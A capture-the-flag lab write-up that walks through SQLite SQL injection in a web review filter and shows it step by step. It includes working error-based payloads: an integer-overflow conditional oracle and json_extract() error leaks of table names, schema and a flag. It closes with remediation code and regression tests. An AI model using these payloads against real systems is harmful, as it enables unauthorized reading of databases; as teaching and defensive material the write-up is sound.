---
title: "WebVerse LeakyPipe: SQLite SQL Injection with Conditional-Error Oracle"
date: 2026-08-11T00:00:00+02:00
lastmod: 2026-08-11T00:00:00+02:00
draft: false
author: "Mdk22"
description: "A public review date filter accepted SQLite syntax, exposed verbose errors, and produced a repeatable error/no-error signal for targeted reads."
summary: "The public `after` filter on `GET /reviews` entered SQLite syntax. Because the page discarded query rows, a repeatable error/no-error check and a limited direct error leak were used to reach one internal configuration value before WebVerse accepted the flag."
categories:
  - "Web Security Write-Ups"
tags:
  - "WebVerse"
  - "LeakyPipe"
  - "SQLite"
  - "SQL Injection"
  - "Error-Based Blind SQL Injection"
  - "Verbose Error Disclosure"
  - "Caido"
  - "CWE-89"
  - "CWE-209"
platform: "WebVerse"
lab: "LeakyPipe"
difficulty: "Medium"
showToc: true
TocOpen: false
case_id: "CASE-010"
case_featured: false
case_summary_short: "A SQLite injection in the public review filter used repeatable error/no-error responses to reach one value in `internal_config`."
case_status: "SOLVED / VERIFIED"
case_classification: "SQLite SQL Injection / Verbose Error Disclosure"
case_family: "server-side-injection"
case_evidence:
  - "Caido"
case_verified: true
case_caido: true
case_independent_curl: false
primary_cwe: "CWE-89"
cwes:
  - "CWE-89"
  - "CWE-209"
patterns:
  - "SQL Injection"
  - "Error-Based Blind SQL Injection"
  - "Sensitive Configuration Disclosure"
methods:
  - "Quote Differential"
  - "Conditional Error Oracle"
  - "Authoritative Status Check"
---

> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. Current hostnames, session values, application paths, objective material, and secret-equivalent HEX are excluded. The public objective representation is `WEBVERSE{REDACTED}`.

## Executive Summary

LeakyPipe exposed an unauthenticated review filter at `GET /reviews` through the `after` query parameter. A benign date produced the normal review state, while a one-character apostrophe mutation reached the SQL parser and triggered a verbose SQLite exception. The response disclosed the generated `SELECT` statement, an application source line, and `sqlite3.OperationalError` details.

A conventional TRUE/FALSE content comparison was not usable: both predicates rendered the same 31-review page. The exposed execution line showed that the query result was fetched and discarded, so distinct SQL outcomes did not need to change the visible page. A SQLite conditional-error expression using `abs(-9223372036854775808)` supplied a reliable replacement oracle: TRUE returned the normal review page; FALSE returned `sqlite3.OperationalError: integer overflow`. The mapping was validated twice, with reversed request order in the second run.

The remaining checks stayed focused. A true/false condition confirmed that a relevant configuration table existed. A structured SQLite error then returned the single matching name, `internal_config`, and a HEX-encoded DDL read showed its `k`, `value`, and `notes` columns. I decoded one selected value in Caido Convert and submitted it to WebVerse. There was no schema dump, scanner, write action, or request after the solve.

> **CONFIRMED FINDING**
>
> The public `after` value is interpreted as SQLite syntax instead of staying a date value. The issue allows unauthenticated SQL injection, exposes verbose database errors, provides a repeatable error/no-error signal, and can return one internal configuration value.

## 1. Report Profile

| Field | Verified value |
| --- | --- |
| Platform | WebVerse |
| Lab | LeakyPipe |
| Difficulty | Medium |
| Status | Solved / Verified |
| Affected endpoint | `GET /reviews` |
| Injectable parameter | `after` |
| Database behavior | SQLite / `sqlite3.OperationalError` |
| Primary weakness | [CWE-89](/cwes/cwe-89/): SQL Injection |
| Supporting weakness | [CWE-209](/cwes/cwe-209/): verbose error disclosure |
| Evidence | Fresh Caido Browser, History, Replay, Convert, and WebVerse solved-state evidence |

### Verified Attack Chain

```text
GET /reviews?after=2024-02-12
  > Normal review state; 31 reviews shown
Append one apostrophe to after
  > SQLite parser failure, generated SELECT, source line, and traceback exposed
Syntactically valid TRUE / FALSE content controls
  > Both render 31 reviews; content is not a truth oracle
Conditional SQLite error control
  > TRUE = normal response; FALSE = integer overflow, repeated in reversed order
Targeted sqlite_master precheck
  > Relevant configuration-class relation exists
Structured json_extract() error channel
  > One matching relation name: internal_config
HEX-encoded DDL read
  > internal_config contains k, value, and notes
One objective-constrained scalar
  > decoded locally in Caido as WEBVERSE{REDACTED}
WebVerse submission
  > CHALLENGE SOLVED / Flag accepted
```

## 2. Scope and Evidence Boundary

Testing was restricted to the fresh authorized LeakyPipe lab instance and the known `/reviews` chain.

- Only one input value changed at a time for every baseline, control, and oracle comparison.
- No unrelated routes, payload families, automated scanners, shell commands, Python scripts, curl flow, or broad enumeration were used.
- No write, destructive, persistence, file-write, command-execution, or privilege-escalation capability was tested.
- The final database read was constrained to one value matching the WebVerse objective form. Its literal and HEX representation are not published.
- After the objective was obtained, no further exploit request was sent to the vulnerable endpoint. Only local Caido decoding and platform submission followed.

The evidence proves the read/disclosure path described here. It does not prove write capability, RCE, an interactive Werkzeug debugger, bulk extraction, or access outside this authorized lab.

## 3. Reproduction Commands and Payloads

The following redacted requests and payloads were used in Caido. Each `http` block keeps the URL-encoded Replay form, while the decoded block shows the `after` value in readable form. The SQL comment ends with `--` plus a required trailing ASCII space. Encoded requests show it as `%20`; decoded blocks describe it so the whitespace is not lost. Temporary hosts, sessions, application paths, and the literal flag are not published.

### 3.1 Legitimate Review Contract

The public review form used `GET /reviews`, an input named `after`, and a `YYYY-MM-DD` format hint. This identified the route, method, input position, and normal value before testing SQL syntax.

![Fresh review form showing the GET /reviews contract and after parameter](LeakyPipe_Figure_01.png)

**Figure 1: Request contract.** The form binds `GET /reviews` to the `after` parameter with a date-format hint.

### 3.2 Normal Baseline

Replaying the harmless value `2024-02-12` returned the normal page with 31 reviews. This is the baseline for later comparisons.

**P-01: Caido Replay request (URL-encoded).**

```http
GET /reviews?after=2024-02-12 HTTP/1.1
Host: <LAB_HOST>
```

Expected result: normal review page; no database error.

![Normal review response showing 31 reviews](LeakyPipe_Figure_02.png)

**Figure 2: Baseline.** The benign request renders the normal review state with 31 reviews shown.

### 3.3 Single-Quote Error and Verbose Disclosure

Only one character changed: a trailing apostrophe was appended to the valid date. The response exposed a SQLite exception, the generated query, an application source line, and the execution behavior showing that result rows were fetched and discarded.

**P-02: Caido Replay request (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27 HTTP/1.1
Host: <LAB_HOST>
```

Expected result: a database-specific parser error. That error links the input to SQLite syntax; HTTP 500 by itself would not be enough.

![SQLite error response exposing generated SQL and redacted application path](LeakyPipe_Figure_03.png)

**Figure 3: Parser differential.** The one-character mutation exposes the generated `SELECT`, source line 110, and `sqlite3.OperationalError`. The application path is redacted.

### 3.4 Non-Injective Content Control

Two syntactically valid predicates were tested with the same route and surrounding context. The TRUE and FALSE outcomes both returned the 31-review presentation and neither raised a database exception.

**P-03: TRUE control in Caido Replay (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20%271%27%3D%271%27%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12' AND '1'='1' --
```

**P-04: FALSE control in Caido Replay (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20%271%27%3D%272%27%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12' AND '1'='2' --
```

Expected result: both requests remain syntactically valid and render the same visible page. This proves that page content is not a usable truth oracle in this query path.

![TRUE control returning the normal review presentation](LeakyPipe_Figure_04.png)

**Figure 4: TRUE content control.** The valid TRUE predicate remains on the normal 31-review state.

![FALSE control returning the same normal review presentation](LeakyPipe_Figure_05.png)

**Figure 5: FALSE content control.** The valid FALSE predicate also renders 31 reviews.

The visible equality does not invalidate the injection. The disclosed execution line shows `conn.execute(sql).fetchall()` with the resulting rows discarded, so distinct SQL outcomes need not affect the rendered HTML.

### 3.5 Conditional-Error Oracle

Because the content channel was non-injective, the reproduction used a SQLite runtime error in the FALSE branch of a `CASE` expression. SQLite raises an integer-overflow error for `abs(-9223372036854775808)`. The TRUE branch returns `1` and does not evaluate the error expression.

**P-05: TRUE branch in Caido Replay (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20CASE%20WHEN%201%3D1%20THEN%201%20ELSE%20abs%28-9223372036854775808%29%20END%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12' AND CASE WHEN 1=1 THEN 1 ELSE abs(-9223372036854775808) END --
```

**P-06: FALSE branch in Caido Replay (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20CASE%20WHEN%201%3D2%20THEN%201%20ELSE%20abs%28-9223372036854775808%29%20END%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12' AND CASE WHEN 1=2 THEN 1 ELSE abs(-9223372036854775808) END --
```

Expected result: TRUE returns the normal page; FALSE returns `sqlite3.OperationalError: integer overflow`.

The mapping was repeated in reversed order. The second FALSE branch reproduced the same overflow, and the following TRUE branch returned to the normal state. That control rules out interpreting a one-off HTTP 500 as a truth signal.

![Reversed-order FALSE branch showing SQLite integer overflow and client-facing debug warning](LeakyPipe_Figure_06.png)

**Figure 6: FALSE oracle branch.** The repeated FALSE branch triggers `sqlite3.OperationalError: integer overflow` and exposes a Flask debug-error-page warning.

![Reversed-order TRUE branch returning the normal review state](LeakyPipe_Figure_07.png)

**Figure 7: TRUE oracle branch.** The repeated TRUE control returns to the normal 31-review state.

### 3.6 Targeted Precheck

The confirmed error/no-error check was used once to ask whether a non-system `sqlite_master` name or DDL contained `admin`, `config`, or `setting`. It did not enumerate every table.

**P-07: Caido Replay request (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20CASE%20WHEN%20EXISTS%28SELECT%201%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20AND%20name%20NOT%20LIKE%20%27sqlite_%25%27%20AND%20%28lower%28name%29%20LIKE%20%27%25admin%25%27%20OR%20lower%28name%29%20LIKE%20%27%25config%25%27%20OR%20lower%28name%29%20LIKE%20%27%25setting%25%27%20OR%20lower%28coalesce%28sql%2C%27%27%29%29%20LIKE%20%27%25admin%25%27%20OR%20lower%28coalesce%28sql%2C%27%27%29%29%20LIKE%20%27%25config%25%27%20OR%20lower%28coalesce%28sql%2C%27%27%29%29%20LIKE%20%27%25setting%25%27%29%29%20THEN%201%20ELSE%20abs%28-9223372036854775808%29%20END%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```sql
2024-02-12' AND CASE WHEN EXISTS(
  SELECT 1
  FROM sqlite_master
  WHERE type='table'
    AND name NOT LIKE 'sqlite_%'
    AND (
      lower(name) LIKE '%admin%'
      OR lower(name) LIKE '%config%'
      OR lower(name) LIKE '%setting%'
      OR lower(coalesce(sql,'')) LIKE '%admin%'
      OR lower(coalesce(sql,'')) LIKE '%config%'
      OR lower(coalesce(sql,'')) LIKE '%setting%'
    )
) THEN 1 ELSE abs(-9223372036854775808) END --
```

Expected result: the normal TRUE response if at least one relevant table exists. Reflected copies of the string `sqlite_master` were ignored; only the repeatable error/no-error result counted.

### 3.7 One Relation Name Through a Structured Error

After the positive check, SQLite `json_extract()` was called with an invalid JSON path. The selected table name became part of that path and appeared in the exception. This returned one matching name without extracting it character by character.

**P-08: Caido Replay request (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20json_extract%28%27%7B%7D%27%2C%27%21%27%20%7C%7C%20%28SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20AND%20name%20NOT%20LIKE%20%27sqlite_%25%27%20AND%20%28lower%28name%29%20LIKE%20%27%25admin%25%27%20OR%20lower%28name%29%20LIKE%20%27%25config%25%27%20OR%20lower%28name%29%20LIKE%20%27%25setting%25%27%20OR%20lower%28coalesce%28sql%2C%27%27%29%29%20LIKE%20%27%25admin%25%27%20OR%20lower%28coalesce%28sql%2C%27%27%29%29%20LIKE%20%27%25config%25%27%20OR%20lower%28coalesce%28sql%2C%27%27%29%29%20LIKE%20%27%25setting%25%27%29%20ORDER%20BY%20name%20LIMIT%201%29%29%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12'
AND json_extract(
  '{}',
  '!' || (
    SELECT name
    FROM sqlite_master
    WHERE type='table'
      AND name NOT LIKE 'sqlite_%'
      AND (
        lower(name) LIKE '%admin%' OR lower(name) LIKE '%config%' OR lower(name) LIKE '%setting%'
        OR lower(coalesce(sql,'')) LIKE '%admin%' OR lower(coalesce(sql,'')) LIKE '%config%' OR lower(coalesce(sql,'')) LIKE '%setting%'
      )
    ORDER BY name
    LIMIT 1
  )
) --
```

Expected result: SQLite rejects the invalid JSON path and includes the dynamically selected name in the exception. The fresh result was `internal_config`.

![SQLite bad JSON path error containing the dynamically evaluated internal_config name](LeakyPipe_Figure_08.png)

**Figure 8: Relation-name leak.** The structured error transfers the single relevant relation name `internal_config`.

### 3.8 Targeted DDL Read and Objective Validation

Only the confirmed `internal_config` relation was queried for its `CREATE TABLE` definition. The scalar was HEX-encoded before being transferred through the same error channel, keeping the error path ASCII-safe.

**P-09: Caido Replay request (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20json_extract%28%27%7B%7D%27%2C%27%21%27%20%7C%7C%20hex%28%28SELECT%20sql%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20AND%20name%3D%27internal_config%27%20LIMIT%201%29%29%29%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12'
AND json_extract(
  '{}',
  '!' || hex((
    SELECT sql
    FROM sqlite_master
    WHERE type='table'
      AND name='internal_config'
    LIMIT 1
  ))
) --
```

The decoded DDL showed the three columns needed for the next read:

```sql
CREATE TABLE internal_config (
  k TEXT PRIMARY KEY,
  value TEXT NOT NULL,
  notes TEXT
)
```

![HEX-encoded DDL read for internal_config](LeakyPipe_Figure_09.png)

**Figure 9: DDL read.** The direct-error channel returns a HEX scalar that decodes to the `internal_config` structure.

The final read selected a single `value` matching the platform objective grammar. The returned HEX and literal are intentionally omitted.

**P-10: Caido Replay request (URL-encoded).**

```http
GET /reviews?after=2024-02-12%27%20AND%20json_extract%28%27%7B%7D%27%2C%27%21%27%20%7C%7C%20hex%28%28SELECT%20value%20FROM%20internal_config%20WHERE%20value%20GLOB%20%27WEBVERSE%7B%2A%7D%27%20LIMIT%201%29%29%29%20--%20 HTTP/1.1
Host: <LAB_HOST>
```

**Decoded `after` payload.**

```text
2024-02-12'
AND json_extract(
  '{}',
  '!' || hex((
    SELECT value
    FROM internal_config
    WHERE value GLOB 'WEBVERSE{*}'
    LIMIT 1
  ))
) --
```

Expected result: one HEX scalar is transferred through the exception. It was decoded locally with Caido Convert only after matching the complete WebVerse objective form.

**P-11: local Caido Convert validation.**

```text
Convert Start -> Hex Decode -> Convert End
Input:  <OBJECTIVE_HEX_REDACTED>
Output: WEBVERSE{REDACTED}
```

Expected result: local HEX decoding confirms the complete WebVerse objective form. The objective-derived HEX and literal remain excluded from the public article.

![Caido Convert showing redacted objective decoding](LeakyPipe_Figure_10.png)

**Figure 10: Local validation.** Caido Convert confirms the decoded value has the WebVerse objective format; both the input HEX and literal are redacted.

### 3.9 WebVerse Solved State and Stop Point

I submitted the recovered value through WebVerse. The platform accepted it and marked the lab solved. No further request was sent to `/reviews`.

![WebVerse LeakyPipe solved state](LeakyPipe_Figure_11.png)

**Figure 11: WebVerse validation.** WebVerse marked LeakyPipe as **CHALLENGE SOLVED** and accepted the objective.

## 4. Root Cause

The error response shows that `after` is inserted inside the following SQL shape rather than safely bound as data:

```sql
SELECT reviewer, stars, body, posted_date
FROM reviews
WHERE posted_date > '<after>'
ORDER BY posted_date DESC
```

An apostrophe from the request changes SQL syntax, which is consistent with direct string interpolation or concatenation. The client-facing error page then amplifies the weakness by disclosing the database engine, quote context, generated SQL, source location, and execution behavior.

The public review feature shares a SQLite database with `sqlite_master` and `internal_config`. That design turns a low-sensitivity date filter into a path to internal configuration data.

## 5. Classification and Impact

| Classification | Mapping | Evidence basis |
| --- | --- | --- |
| Primary | [CWE-89](/cwes/cwe-89/): SQL Injection | Input changes SQLite syntax, creates a repeatable error/no-error signal, and allows targeted reads. |
| Secondary | [CWE-209](/cwes/cwe-209/): Error Message Containing Sensitive Information | The client receives exception details, generated SQL, source information, and traceback. |
| Database | SQLite | `sqlite3.OperationalError`, `sqlite_master`, integer-overflow behavior, and `json_extract()` behavior are all observed. |

The confirmed impact is unauthenticated SQL injection that can read database metadata and one internal configuration value. I did not test data modification, persistence, file access, command execution, or broad extraction.

## 6. False-Positive Controls

| Potential false signal | Control | Result |
| --- | --- | --- |
| A single HTTP 500 could be transient. | Parser details and generated SQL were required; the conditional error was repeated in reverse order. | SQL parser reachability and a stable FALSE branch were independently confirmed. |
| TRUE/FALSE page content could be identical despite SQL execution. | Both predicates were compared with the same baseline; disclosed execution shows rows are discarded. | Content was classified as non-injective rather than treated as a failed SQLi test. |
| `sqlite` text could be reflected. | Only specific SQLite exception and integer-overflow markers were accepted as DB evidence. | Reflection was not treated as proof. |
| A relation name could be reflected input. | `internal_config` was dynamically evaluated rather than supplied literally in the selector. | The error channel is evidence of one evaluated relation name. |

## 7. Remediation

### Parameterize the review query

Parse the date before database use and bind the normalized value as a query parameter.

```python
from datetime import date

raw_after = request.args.get('after')
try:
    after_date = date.fromisoformat(raw_after)
except (TypeError, ValueError):
    return {'error': 'Invalid date'}, 400

rows = conn.execute(
    '''
    SELECT reviewer, stars, body, posted_date
    FROM reviews
    WHERE posted_date > ?
    ORDER BY posted_date DESC
    ''',
    (after_date.isoformat(),)
).fetchall()
```

### Remove client-facing debug and SQL details

Production responses should be generic. Database exceptions, generated SQL, source paths, source lines, and tracebacks belong only in protected server-side logs. Disabling debug mode is necessary, but handlers must also avoid serializing detailed exceptions to clients.

### Separate public and internal data paths

The public review feature should not share unrestricted reachability to internal configuration data. With SQLite, separate database files or application-level access boundaries may be more practical than database-account privileges. The design goal is that review queries cannot reach `internal_config` or unrelated `sqlite_master` metadata.

### Add regression coverage

- `after=2024-02-12` returns the expected normal review response.
- `after=2024-02-12'` is rejected before SQL parsing, for example with HTTP 400.
- SQL predicate syntax in `after` is rejected before database execution.
- Client responses contain no SQLite exception text, generated SQL, traceback, or application source path.
- The review data-access path cannot read internal configuration relations.

## 8. Validation Guidance

A remediation retest should preserve the baseline/control relationship from this report. Verify the legitimate date filter first. Then repeat only the minimal apostrophe mutation and confirm that the application rejects it before SQL parsing. Absence of a 500 alone is not enough: the response must also omit database-specific details and generated SQL. Finally, verify through architecture or controlled access tests that the review path cannot reach internal configuration storage.

## Conclusion

LeakyPipe is a SQLite injection where normal TRUE/FALSE content comparisons fail because the page discards query rows. A repeatable runtime error provided the true/false signal, while an invalid `json_extract()` path returned selected text through the exception. The reproduction covers the public request, SQLite parser error, verbose exception, two-run condition check, limited `internal_config` metadata, one selected value, local Caido decoding, and WebVerse acceptance.

The fix is broader than input validation alone. Parameterized SQL, safe exception handling, and separation between public feature data and internal configuration all break this path.
